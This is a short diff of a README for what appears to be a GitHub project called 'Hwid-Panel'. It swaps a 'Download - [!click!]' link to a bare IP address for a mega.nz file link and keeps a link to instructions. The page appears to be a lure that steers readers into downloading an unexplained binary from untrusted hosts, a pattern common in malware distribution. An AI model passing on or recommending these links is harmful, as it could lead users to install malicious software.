@@ -1,4 +1,4 @@
-# Download - [!click!](http://91.210.165.22/GH5PQnj8)
+# Download - [!click!](https://mega.nz/file/MfUy2JqB#kZilLoQ3CLUanDaZypC3LTmZDIXj2qog3dHdSxsw7UI)
 
 # Instructions - [Click](https://github.com/kond3ve1/Hwid-Panel/blob/main/Instructions)
 
